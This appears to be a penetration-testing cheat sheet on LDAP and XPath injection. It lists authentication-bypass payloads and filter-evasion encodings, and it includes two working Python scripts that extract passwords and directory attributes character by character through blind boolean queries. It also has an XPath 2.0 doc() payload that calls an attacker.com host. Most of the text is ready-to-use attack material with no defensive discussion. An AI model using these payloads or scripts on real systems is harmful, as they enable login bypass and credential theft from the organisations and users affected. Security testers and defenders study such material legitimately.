# LDAP and XPath Injection

## LDAP Injection

### Detection
**When**: App queries an LDAP directory (Active Directory, OpenLDAP) using user input in filter strings.
```
# LDAP filter syntax: (&(uid=USER)(password=PASS))
# Inject: USER = *)(uid=*))(|(uid=*
# Result: (&(uid=*)(uid=*))(|(uid=*)(password=PASS)) → always true
```

### Authentication Bypass
```
# Basic bypass (username field):
*
admin)(|(password=*
*)(uid=*))(|(uid=*

# Basic bypass (password field):
*
*)(&
*)(|(password=*

# Blind LDAP — extract data character by character:
admin)(|(password=a*    → if login succeeds, password starts with 'a'
admin)(|(password=ab*   → narrow down character by character
```

### Attribute Enumeration
```
# Discover attributes by injecting wildcards in different positions:
*)(ATTRIBUTE=*    → vary ATTRIBUTE: cn, sn, mail, telephoneNumber, description
# If response differs when attribute exists vs doesn't, it's present

# Extract attribute values:
*)(description=a*    → binary search on each character
```

### Blind Boolean Extraction
```python
# IN: login_url, known_username  OUT: extracted attribute value
import requests, string

extracted = ''
for pos in range(100):
    found = False
    for c in string.printable:
        payload = f'{known_user})(description={extracted}{c}*'
        r = requests.post(login_url, data={'user': payload, 'pass': '*'})
        if 'Welcome' in r.text:
            extracted += c; found = True; break
    if not found: break
print(f"Description: {extracted}")
```

### Filter Bypass
| Filter | Bypass |
|---|---|
| `*` blocked | Use hex: `\2a` |
| `(` blocked | `\28` |
| `)` blocked | `\29` |
| `\` blocked | `\5c` |
| NUL | `\00` |

## XPath Injection

### Detection
**When**: App queries XML data using XPath with user input.
```
# XPath query: //user[username='USER' and password='PASS']
# Inject: USER = ' or '1'='1
# Result: //user[username='' or '1'='1' and password='PASS'] → always true
```

### Authentication Bypass
```
' or '1'='1
' or ''='
admin' or '1'='1' or '1'='1
' or 1=1 or ''='
```

### Data Extraction
```
# Extract node names:
' or name()='user' or '1'='1

# Extract attribute values:
' or //user[position()=1]/password/text()='a

# Count nodes:
' or count(//user)>0 or '1'='1
```

### Blind XPath Extraction
```python
# IN: query_url, param_name  OUT: extracted XML data
import requests, string

# Extract string-length first
for length in range(1, 100):
    payload = f"' or string-length(//user[1]/password)={length} or '1'='1"
    r = requests.get(query_url, params={param_name: payload})
    if 'found' in r.text:
        break

# Extract character by character
password = ''
for pos in range(1, length + 1):
    for c in string.printable:
        payload = f"' or substring(//user[1]/password,{pos},1)='{c}"
        r = requests.get(query_url, params={param_name: payload})
        if 'found' in r.text:
            password += c; break
print(f"Password: {password}")
```

### XPath 2.0 Extensions
```
# If XPath 2.0: doc() function can read external files
' or doc('http://attacker.com/xxe')='' or '1'='1
```
